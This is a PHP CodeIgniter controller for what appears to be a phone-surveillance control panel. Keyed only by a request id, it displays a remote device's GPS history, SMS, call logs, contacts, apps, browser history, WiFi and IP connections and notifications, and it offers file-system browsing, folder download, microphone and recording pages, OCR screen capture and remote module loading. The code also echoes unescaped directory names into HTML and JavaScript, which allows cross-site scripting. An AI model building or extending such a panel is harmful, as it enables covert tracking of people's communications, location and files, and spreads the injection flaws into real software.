<?php
//error_reporting(0);
class User extends CI_Controller
{
 
    function User()
    {
        parent::__construct();
        $this->load->helper(array('form', 'url','constant_helper','function_helper'));
        $this->load->model('admin_model');    
		  $this->load->model('user_model');     
        $this->load->library('session');
        $this->clear_cache();
        $user = $this->session->userdata('logged_in');
        if (!$user) {
            redirect('login/index');
        }
		if(!isset($_REQUEST['id'])){
			redirect('admin/index');
		}
		updateActivity();
	isDeviceReady($_REQUEST['id']);
		 
    }

    function index()
    {
    	  $wifi = $this->user_model->get_users_wifi($_REQUEST['id']);
			 
      $data['wifi'] = $wifi;
	  
	  $devicedata = $this->user_model->get_users_device($_REQUEST['id']);
      $data['devicedata'] = $devicedata;
	  
    		 	$lat= $lng=$timing="";
	 ////----------------////////	
			 	$contact_list =$userlocationarr  = array();
	 	 	$location = $this->user_model->get_gpsTrack_dash($_REQUEST['id']);
			 if(count($location)>0){
			 	  $location[0]['location_detail'];
			$locationarr	= explode("|", $location[0]['location_detail']);
			$locationarr = array_reverse($locationarr);
		 $raw = $locationarr[0];
		 
				$temp =trim($raw,"[");
				$loc =trim($temp,"]");
				$locationpoint = explode(",", $loc);
				if(count($locationpoint)>0){
			   $lat	= $locationpoint[0];
				 $lng	= $locationpoint[1]; 
				 $timing = $locationpoint[2];
				}
		 
			 }
	  ///-----------///
	   $data['timing'] = $timing;
	  $data['lat'] = $lat;
	  	  $data['lng'] = $lng;
		$data['lng'] = $lng;
        /// get dashboard data
        //contact
         $contact = $this->user_model->get_users_contact($_REQUEST['id']);
         $check_count = count($contact); 
        if($check_count>0){
        	$device= get_unserialize($contact[0]['contact_detail']);
			$contact_count  = count($device);
			
        }else{
        	$contact_count = 0;
        }
		 $data['contact_count'] = $contact_count;
		 
		
		 //end contact
		 
		 
		 // app 
		 $deviceapps = $this->user_model->get_deviceapps($_REQUEST['id']);
		 $check_apps = count($deviceapps); 
		  if($check_apps>0){
        	 
			 $device= get_unserialize($deviceapps[0]['app_detail']);
			$apps_count  = count($device);
        }else{
        	$apps_count = 0;
        }
		 $data['apps_count'] = $apps_count;
		 //end apps
		 
		 // sms
		  $message = $this->user_model->get_users_message($_REQUEST['id']);
		  $check_message = count($message); 
		  if($check_message>0){
        	$device= json_decode($message[0]['sms_detail'],true); 
		 
			$sms_count  = count($device);
        }else{
        	$sms_count = 0;
        }
		 $data['sms_count'] = $sms_count;
		  
					
		 
		 
		 //end sms
		 
		 //call log
		 $calllogs = $this->user_model->get_users_calllogs($_REQUEST['id']);
		  $check_call_log = count($calllogs); 
		  if($check_call_log>0){
         
		 $device= get_unserialize($calllogs[0]['call_detail']);
			$call_log_count  = count($device);
			$call_list = $device;
        }else{
        	$call_log_count = 0;
        }
		 $data['call_log_count'] = $call_log_count;
		 
		  
		 
		 //end call log
		   $devicedata = $this->user_model->get_users_device($_REQUEST['id']);
      $data['devicedata'] = $devicedata;
        /// end of dashboad data
		
		  $data['call_list'] = $call_list;
        $data['active_page'] = 'index';
	
       $this->load->view('user/header2', $data);
        $this->load->view('user/dashboard',$data);
    }

 function getUserLocationDashboard()
	 {
	 	$userlocationarr  = array();
	 	 	$location = $this->user_model->get_gpsTrack_dash($_REQUEST['id']);
			 if(count($location)>0){
			 	  $location[0]['location_detail'];
			$locationarr	= explode("|", $location[0]['location_detail']);
			$locationarr = array_unique($locationarr);
			foreach ($locationarr as $raw) {
				$temp =trim($raw,"[");
				$loc =trim($temp,"]");
				$locationpoint = explode(",", $loc);
			   $lat	= $locationpoint[0];
				 $lng	= $locationpoint[1]; 
				$userlocationarr[] = array("lat"=>$lat,"lng"=>$lng);
			}
			 }
		echo	 json_encode($userlocationarr);
       
	  //echo "<pre>";
	  //print_r($userlocationarr);exit;
	 }
	 
	 function deleteFileItem()
    {
        $devicedata = $this->user_model->deleteFileItem();
      if($devicedata){
      	echo 1;
      }else{
      	echo 0;
      }
    }
	 
function save_user_setting()
    {
        $devicedata = $this->user_model->save_user_setting();
      if($devicedata){
      	echo 1;
      }else{
      	echo 0;
      }
    }
	function cancleRequest()
    {
        $devicedata = $this->user_model->cancleRequest();
      if($devicedata){
      	echo 1;
      }else{
      	echo 0;
      }
    }
	function device_info()
    {
        $devicedata = $this->user_model->get_users_device($_REQUEST['id']);
      $data['devicedata'] = $devicedata;
        $data['active_page'] = 'device_info';
	
       $this->load->view('user/header2', $data);
        $this->load->view('user/index',$data);
    }
	 function contact()
	 {
	 	     $contact = $this->user_model->get_users_contact($_REQUEST['id']);
      $data['contact'] = $contact;
	 	$data['active_page'] = 'contact';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/contact',$data);
	 }
	 	 function notifications()
	 {
	 	     $noticedata = $this->user_model->get_users_notifications($_REQUEST['id']);
      $data['noticedata'] = $noticedata;
	 	$data['active_page'] = 'notifications';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/notifications',$data);
	 }
	 
	 function file_explorer()
	 {
	 	
	  
	 	 	$data['active_page'] = 'file_explorer';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/file_explorer_grid',$data);
	 }
	 
	 function get_file_explorer_grid(){
	 	$griddata = $this->user_model->file_explorer_grid_data($_REQUEST['id']);
		 $directory = array();
		foreach ($griddata as $raw) {
		 $patharr	= array_filter(explode("/",$raw['filepath']));
			if(count($patharr)>0){
				 foreach ($patharr as $val) {
					 if(strlen($val)>0){
					 	$directory[] = $val;
						 break;
					 }
				 }
			}
		}
		if(count($directory)>0){
		$uniquedir = array_unique($directory);
			foreach ($uniquedir as $dir) {
				
			 
       ?>
        <!--   <div class="col-lg-2 col-xs-2">
         
              <div class="small-box bg-aqua">
              	 <div class="icon">
                  <i class="ion-folder"></i>
                </div>
                <div class="inner">
                	<h3>&nbsp;</h3>
                	<b><?php echo $dir; ?></b>
             <p><a  onclick="download_folder('<?php  echo $dir?>')" style="cursor: pointer;color:red;">(Download)</a></p>
                
                  
                </div>
               
                <a style="cursor: pointer" onclick="get_file_explorer_gridchild('<?php echo $dir;?>')" class="small-box-footer">View <i class="fa  fa-hand-pointer-o"></i></a>
              </div>
           </div>---->
            
            <!---------start------>
            	
            	<div class="col-lg-3 col-sm-8 col-xs-16 ">
                            <div class="media flex-column  "> <span class="message_userpic text-danger"><i class="fa fa-folder"></i></span>
                              <div class="media-body">
                                <h6  class="mt-0 mb-1"><?php echo $dir; ?></h6>
                              <button onclick="get_file_explorer_gridchild('<?php echo $dir;?>')" class="btn btn-link btn-sm" ><i class="fa fa-eye m-0"></i> View</button>  | <button onclick="download_folder('<?php  echo $dir?>')"  class="btn btn-link btn-sm"><i class="fa fa-download m-0"></i> Download</button>
                              </div>
                            </div>
                        </div>
            	<!------end --------->
            
            
            
       <?php
			}
		}
	 }

 function get_file_explorer_gridchild(){
	 	$griddata = $this->user_model->get_file_explorer_gridchild($_REQUEST['id'],$_REQUEST['dir']);
		 $directory = array();
		// echo "<pre>";
		foreach ($griddata as $raw) {
			//print_r($raw);
			// echo "=><br>";
		 //$patharr	= array_filter(explode($_REQUEST['dir']."/",$raw['filepath']));
		$patharr	=  explode($_REQUEST['dir']."/",$raw['filepath']) ;	 
		$patharrcount = 	count($patharr);
			if($patharrcount>0){
				if($patharrcount>=1){
					//echo "****************up***********";
					//print_r($patharr);
					
					 	$pathremain = $patharr[1];
					/// get dir
						 $patharr_remain	= array_filter(explode("/",$pathremain));
			if(count($patharr_remain)>0){
				 foreach ($patharr_remain as $val) {
					 if(strlen($val)>0){
					 	$directory[] = $val;
						 break;
					 }
				 }
			}else{
				$directory[] = $pathremain;
			}
					
					///end get dir
						 
				}else{
					//echo "****************down***********";
				//	print_r($patharr);
					$pathremain = $patharr[0]; 
						/// get dir
						 $patharr_remain	= array_filter(explode("/",$pathremain));
			if(count($patharr_remain)>0){
				 foreach ($patharr_remain as $val) {
					 if(strlen($val)>0){
					 	$directory[] = $val;
						 break;
					 }
				 }
			}else{
				$directory[] = $patharr_remain;
			}
					
					///end get dir
					
				}
			}
		}
		//exit;
		if(count($directory)>0){
		$uniquedir = array_unique($directory);
			foreach ($uniquedir as $dir) {
				
			 
       ?>
          <!--- <div class="col-lg-2 col-xs-2">
             
              <div class="small-box bg-aqua">
                <div class="inner">
                	<h3>&nbsp;</h3>
                	<b><?php  echo $dir?></b>
                    <p><a  onclick="download_folder('<?php  echo $dir?>')" style="cursor: pointer;color:red;">(Download)</a></p>
                
                  
                </div>
                <div class="icon">
                  <i class="ion-folder"></i>
                </div>
                <a style="cursor: pointer" onclick="get_file_explorer_gridchild('<?php echo  $dir;?>')" class="small-box-footer">View <i class="fa  fa-hand-pointer-o"></i></a>
               </div>
           </div>--->
           
                       <!---------start------>
            	
            	<div class="col-lg-3 col-sm-8 col-xs-16 ">
                            <div class="media flex-column  "> <span class="message_userpic text-danger"><i class="fa fa-folder"></i></span>
                              <div class="media-body">
                                <h6  class="mt-0 mb-1"><?php echo $dir; ?></h6>
                              <button onclick="get_file_explorer_gridchild('<?php echo $dir;?>')" class="btn btn-link btn-sm" ><i class="fa fa-eye m-0"></i> View</button>  | <button onclick="download_folder('<?php  echo $dir?>')"  class="btn btn-link btn-sm"><i class="fa fa-download m-0"></i> Download</button>
                              </div>
                            </div>
                        </div>
            	<!------end --------->
       <?php
			}
		}
	 }
	 
	  function file_explorer_list()
	 {
	 	 
	  
	 	 	$data['active_page'] = 'file_explorer';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/file_explorer',$data);
	 }
	 
	 function recording()
	 {
	 	$data['active_page'] = 'recording';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/recording',$data);
	 }
	 
	  function microphone()
	 {
	 	$data['active_page'] = 'microphone';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/microphone',$data);
	 }
	 
	   function ocr_screen_list()
	 {
	 	 
	  
	 	 	$data['active_page'] = 'ocrscreen';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/ocr_file_explorer',$data);
	 }
	 
	 function calllogs()
	 {
	 	     $calllogs = $this->user_model->get_users_calllogs($_REQUEST['id']);
      $data['calllogs'] = $calllogs;
	 	$data['active_page'] = 'calllog';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/calllogs',$data);
	 }
	 
	 function wifi()
	 {
	 	     $wifi = $this->user_model->get_users_wifi($_REQUEST['id']);
			 
      $data['wifi'] = $wifi;
	 	$data['active_page'] = 'wifi';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/wifi',$data);
	 }
	 	 function ipconnections()
	 {
	 	     $wifi = $this->user_model->get_ipconnections($_REQUEST['id']);
			 
      $data['wifi'] = $wifi;
	 	$data['active_page'] = 'ipconnections';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/ipconnections',$data);
	 }
	 function browser()
	 {
	 	$browser = $this->user_model->get_users_browser($_REQUEST['id']);
			 
      $data['browser'] = $browser;
	 	$data['active_page'] = 'browser';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/browser',$data);
	 }
	 function deviceapps()
	 {
	 	$deviceapps = $this->user_model->get_deviceapps($_REQUEST['id']);
			 
      $data['deviceapps'] = $deviceapps;
	 	$data['active_page'] = 'deviceapps';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/deviceapps',$data);
	 }
	 function gpsTrack()
	 {
	 	$lat= $lng="";
	 ////----------------////////	
			 	$userlocationarr  = array();
	 	 	$location = $this->user_model->get_gpsTrack($_REQUEST['id']);
			 if(count($location)>0){
			 	  $location[0]['location_detail'];
			$locationarr	= explode("|", $location[0]['location_detail']);
		 $raw = $locationarr[0];
		 
		 
				$temp =trim($raw,"[");
				$loc =trim($temp,"]");
				$locationpoint = explode(",", $loc);
			   $lat	= $locationpoint[0];
				 $lng	= $locationpoint[1]; 
				 
		 
			 }
	  ///-----------///
	  
	  
	  
	  $data['lat'] = $lat;
	  	  $data['lng'] = $lng;
	 	$data['active_page'] = 'location';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/location',$data);
	 }
	 function getUserLocation()
	 {
	 	if(isset($_POST['choosedate'])){
			$date_arr = explode("/", $_POST['choosedate']);
			$gm_time = $date_arr[2].'-'.$date_arr[0].'-'.$date_arr[1];
		}else{
			date_default_timezone_set("UTC");
			$gm_time = gmdate("Y-m-d");
		}
		
		
	 	$userlocationarr  = array();
	 	 	$location = $this->user_model->get_gpsTrack($_REQUEST['id']);
			 if(count($location)>0){
			 	  $location[0]['location_detail'];
			$locationarr	= explode("|", $location[0]['location_detail']);
			//$locationarr = array_unique($locationarr);
			foreach ($locationarr as $raw) {
				$temp =trim($raw,"[");
				$loc =trim($temp,"]");
				$locationpoint = explode(",", $loc);
			   $lat	= $locationpoint[0];
				 $lng	= $locationpoint[1];
				  $timing	= $locationpoint[2];  
				$userlocationarr[] = array("lat"=>$lat,"lng"=>$lng,"timing"=>$gm_time." ".$timing);
			}
			 }
		echo	 json_encode($userlocationarr);
       
	  //echo "<pre>";
	  //print_r($userlocationarr);exit;
	 }
    function messages()
	 {
	 	     $message = $this->user_model->get_users_message($_REQUEST['id']);
			  
      $data['message'] = $message;
	 	$data['active_page'] = 'message';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/message',$data);
	 }
    
    function editprofile()
    {
        @$admin[0]->username = $admin[0]->email = $admin[0]->password = "";

        $admin = $this->admin_model->get_admin();
        $data['admin'] = $admin;
        $data['active_page'] = 'admin';
        $this->load->view('header', $data);
        $this->load->view('pages/editprofile');

    }
    function update_profile()
    {
        $admin = $this->admin_model->save_profile();
        if ($admin) {

            $data = 1;
        } else {
            $data = 0;
        }
        echo  $data ;

    }
	
	  function checkDeviceStatus()
    {
        $admin = $this->user_model->checkDeviceStatus();
        if ($admin) {

            $data = 1;
        } else {
            $data = 0;
        }
        echo  $data ;

    }
	  function checkModuleStatus()
    {
        $module = $this->user_model->checkModuleStatus();
        if ($module) {

            $data = array("status"=>1,"module_loading"=>$module['module_loading'],"loading_per"=>$module['loading_per']);
        } else {
            $data = array("status"=>0,"module_loading"=>'',"loading_per"=>0);
      
        }
        echo  json_encode($data) ;

    }
	 function make_device_Ready()
    {
        $admin = $this->user_model->make_device_Ready();
        if ($admin) {

            $data = 1;
        } else {
            $data = 0;
        }
        echo  $data ;

    }
    
       function settings()
	 {
	 			  
      $moduledata = $this->user_model->get_all_module();     
			  
      $resdata = $this->user_model->get_data_settings($_REQUEST['id']);
	  	  $data['moduledata'] = $moduledata;
	  $data['data_settings'] = $resdata;
	 	$data['active_page'] = 'settings';
	 $this->load->view('user/header2', $data);
        $this->load->view('user/settings',$data);
	 }
    

    function clear_cache()
    {
        $this->output->set_header("Cache-Control: no-store, no-cache, must-revalidate, no-transform, max-age=0, post-check=0, pre-check=0");
        $this->output->set_header("Pragma: no-cache");
    }
}
?>